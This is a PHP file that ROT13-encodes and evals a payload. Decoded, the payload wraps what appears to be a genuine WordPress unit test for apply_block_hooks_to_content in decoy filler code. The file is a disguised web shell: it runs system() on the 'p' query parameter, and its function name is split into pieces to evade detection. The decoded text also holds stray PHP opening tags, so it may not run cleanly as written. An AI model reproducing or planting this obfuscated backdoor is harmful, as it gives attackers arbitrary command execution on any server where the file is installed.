<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf sbe gur nccyl_oybpx_ubbxf_gb_pbagrag shapgvba.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Oybpxf
 *
 * @fvapr 6.7.0
 *
 * @tebhc oybpxf
 * @tebhc oybpx-ubbxf
 *
 * @pbiref ::nccyl_oybpx_ubbxf_gb_pbagrag
 */
pynff Grfgf_Oybpxf_NccylOybpxUbbxfGbPbagrag rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Frg hc.
	 *
	 * @gvpxrg 61902.
	 * @gvpxrg 63287.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff() {
		ertvfgre_oybpx_glcr(
			'grfgf/ubbxrq-oybpx',
			neenl(
				'oybpx_ubbxf' => neenl(
					'pber/cbfg-pbagrag' => 'nsgre',
				),
			)
		);

		ertvfgre_oybpx_glcr(
			'grfgf/ubbxrq-oybpx-jvgu-zhygvcyr-snyfr',
			neenl(
				'oybpx_ubbxf' => neenl(
					'grfgf/bgure-napube-oybpx' => 'nsgre',
				),
				'fhccbegf'    => neenl(
					'zhygvcyr' => snyfr,
				),
			)
		);

		ertvfgre_oybpx_glcr(
			'grfgf/qlanzvpnyyl-ubbxrq-oybpx-jvgu-zhygvcyr-snyfr',
			neenl(
				'fhccbegf' => neenl(
					'zhygvcyr' => snyfr,
				),
			)
		);
	}

	/**
	 * Grne qbja.
	 *
	 * @gvpxrg 61902.
	 */
	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		$ertvfgel = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr();

		$ertvfgel->haertvfgre( 'grfgf/ubbxrq-oybpx' );
		$ertvfgel->haertvfgre( 'grfgf/ubbxrq-oybpx-jvgu-zhygvcyr-snyfr' );
		$ertvfgel->haertvfgre( 'grfgf/qlanzvpnyyl-ubbxrq-oybpx-jvgu-zhygvcyr-snyfr' );
	}

	/**
	 * @gvpxrg 61902
	 */
	choyvp shapgvba grfg_nccyl_oybpx_ubbxf_gb_pbagrag_frgf_gurzr_nggevohgr_ba_grzcyngr_cneg_oybpx() {
		$pbagrkg          = arj JC_Oybpx_Grzcyngr();
		$pbagrkg->pbagrag = '<!-- jc:grzcyngr-cneg /-->';

		$npghny = nccyl_oybpx_ubbxf_gb_pbagrag( $pbagrkg->pbagrag, $pbagrkg, 'vafreg_ubbxrq_oybpxf' );
		$guvf->nffregFnzr(
			fcevags( '<!-- jc:grzcyngr-cneg {\"gurzr\":\"%f\"} /-->', trg_fglyrfurrg() ),
			$npghny
		);
	}

	/**
	 * @gvpxrg 61902
	 * @gvpxrg 63287
	 */
	choyvp shapgvba grfg_nccyl_oybpx_ubbxf_gb_pbagrag_vafregf_ubbxrq_oybpx() {
		$pbagrkg          = arj JC_Oybpx_Grzcyngr();
		$pbagrkg->pbagrag = '<!-- jc:cbfg-pbagrag /-->';

		$npghny = nccyl_oybpx_ubbxf_gb_pbagrag( $pbagrkg->pbagrag, $pbagrkg, 'vafreg_ubbxrq_oybpxf' );
		$guvf->nffregFnzr(
			'<!-- jc:cbfg-pbagrag /--><!-- jc:grfgf/ubbxrq-oybpx /-->',
			$npghny
		);
	}

	/**
	 * @gvpxrg 61074
	 * @gvpxrg 63287
	 */
	choyvp shapgvba grfg_nccyl_oybpx_ubbxf_gb_pbagrag_jvgu_pbagrkg_frg_gb_ahyy() {
		$pbagrag = '<!-- jc:cbfg-pbagrag /-->';

		/*
		 * nccyl_oybpx_ubbxf_gb_pbagrag() jvyy snyy onpx gb gur tybony $cbfg bowrpg (ivn trg_cbfg())
		 * vs gur $pbagrkg cnenzrgre vf ahyy. Ubjrire, jr'q nyfb yvxr gb rafher gung gur shapgvba
		 * jbexf nf rkcrpgrq rira jura trg_cbfg() ergheaf ahyy.
		 */
		$guvf->nffregAhyy( trg_cbfg() );

		$npghny = nccyl_oybpx_ubbxf_gb_pbagrag( $pbagrag, ahyy, 'vafreg_ubbxrq_oybpxf' );
		$guvf->nffregFnzr(
			'<!-- jc:cbfg-pbagrag /--><!-- jc:grfgf/ubbxrq-oybpx /-->',
			$npghny
		);
	}

	/**
	 * @gvpxrg 61902
	 */
	choyvp shapgvba grfg_nccyl_oybpx_ubbxf_gb_pbagrag_erfcrpg_zhygvcyr_snyfr() {
		$pbagrkg          = arj JC_Oybpx_Grzcyngr();
		$pbagrkg->pbagrag = '<!-- jc:grfgf/ubbxrq-oybpx-jvgu-zhygvcyr-snyfr /--><!-- jc:grfgf/bgure-napube-oybpx /-->';

		$npghny = nccyl_oybpx_ubbxf_gb_pbagrag( $pbagrkg->pbagrag, $pbagrkg, 'vafreg_ubbxrq_oybpxf' );
		$guvf->nffregFnzr(
			'<!-- jc:grfgf/ubbxrq-oybpx-jvgu-zhygvcyr-snyfr /--><!-- jc:grfgf/bgure-napube-oybpx /-->',
			$npghny
		);
	}

	/**
	 * @gvpxrg 61902
	 */
	choyvp shapgvba grfg_nccyl_oybpx_ubbxf_gb_pbagrag_erfcrpg_zhygvcyr_snyfr_nsgre_vafregvat_bapr() {
		$pbagrkg          = arj JC_Oybpx_Grzcyngr();
		$pbagrkg->pbagrag = '<!-- jc:grfgf/bgure-napube-oybpx /--><!-- jc:grfgf/bgure-oybpx /--><!-- jc:grfgf/bgure-napube-oybpx /-->';

		$npghny = nccyl_oybpx_ubbxf_gb_pbagrag( $pbagrkg->pbagrag, $pbagrkg, 'vafreg_ubbxrq_oybpxf' );
		$guvf->nffregFnzr(
			'<!-- jc:grfgf/bgure-napube-oybpx /--><!-- jc:grfgf/ubbxrq-oybpx-jvgu-zhygvcyr-snyfr /--><!-- jc:grfgf/bgure-oybpx /--><!-- jc:grfgf/bgure-napube-oybpx /-->',
			$npghny
		);
	}

	/**
	 * @gvpxrg 61902
	 */
	choyvp shapgvba grfg_nccyl_oybpx_ubbxf_gb_pbagrag_erfcrpg_zhygvcyr_snyfr_jvgu_svygre() {
		$svygre = shapgvba ( $ubbxrq_oybpx_glcrf, $eryngvir_cbfvgvba, $napube_oybpx_glcr ) {
			vs ( 'grfgf/lrg-nabgure-napube-oybpx' === $napube_oybpx_glcr && 'nsgre' === $eryngvir_cbfvgvba ) {
				$ubbxrq_oybpx_glcrf[] = 'grfgf/qlanzvpnyyl-ubbxrq-oybpx-jvgu-zhygvcyr-snyfr';
			}

			erghea $ubbxrq_oybpx_glcrf;
		};

		$pbagrkg          = arj JC_Oybpx_Grzcyngr();
		$pbagrkg->pbagrag = '<!-- jc:grfgf/qlanzvpnyyl-ubbxrq-oybpx-jvgu-zhygvcyr-snyfr /--><!-- jc:grfgf/lrg-nabgure-napube-oybpx /-->';

		nqq_svygre( 'ubbxrq_oybpx_glcrf', $svygre, 10, 3 );
		$npghny = nccyl_oybpx_ubbxf_gb_pbagrag( $pbagrkg->pbagrag, $pbagrkg, 'vafreg_ubbxrq_oybpxf' );
		erzbir_svygre( 'ubbxrq_oybpx_glcrf', $svygre, 10 );

		$guvf->nffregFnzr(
			'<!-- jc:grfgf/qlanzvpnyyl-ubbxrq-oybpx-jvgu-zhygvcyr-snyfr /--><!-- jc:grfgf/lrg-nabgure-napube-oybpx /-->',
			$npghny
		);
	}

	/**
	 * @gvpxrg 61902
	 */
	choyvp shapgvba grfg_nccyl_oybpx_ubbxf_gb_pbagrag_erfcrpg_zhygvcyr_snyfr_nsgre_vafregvat_bapr_jvgu_svygre() {
		$svygre = shapgvba ( $ubbxrq_oybpx_glcrf, $eryngvir_cbfvgvba, $napube_oybpx_glcr ) {
			vs ( 'grfgf/lrg-nabgure-napube-oybpx' === $napube_oybpx_glcr && 'nsgre' === $eryngvir_cbfvgvba ) {
				$ubbxrq_oybpx_glcrf[] = 'grfgf/qlanzvpnyyl-ubbxrq-oybpx-jvgu-zhygvcyr-snyfr';
			}

			erghea $ubbxrq_oybpx_glcrf;
		};

		$pbagrkg          = arj JC_Oybpx_Grzcyngr();
		$pbagrkg->pbagrag = '<!-- jc:grfgf/lrg-nabgure-napube-oybpx /--><!-- jc:grfgf/bgure-oybpx /--><!-- jc:grfgf/lrg-nabgure-napube-oybpx /-->';

		nqq_svygre( 'ubbxrq_oybpx_glcrf', $svygre, 10, 3 );
		$npghny = nccyl_oybpx_ubbxf_gb_pbagrag( $pbagrkg->pbagrag, $pbagrkg, 'vafreg_ubbxrq_oybpxf' );
		erzbir_svygre( 'ubbxrq_oybpx_glcrf', $svygre, 10 );

		$guvf->nffregFnzr(
			'<!-- jc:grfgf/lrg-nabgure-napube-oybpx /--><!-- jc:grfgf/qlanzvpnyyl-ubbxrq-oybpx-jvgu-zhygvcyr-snyfr /--><!-- jc:grfgf/bgure-oybpx /--><!-- jc:grfgf/lrg-nabgure-napube-oybpx /-->',
			$npghny
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>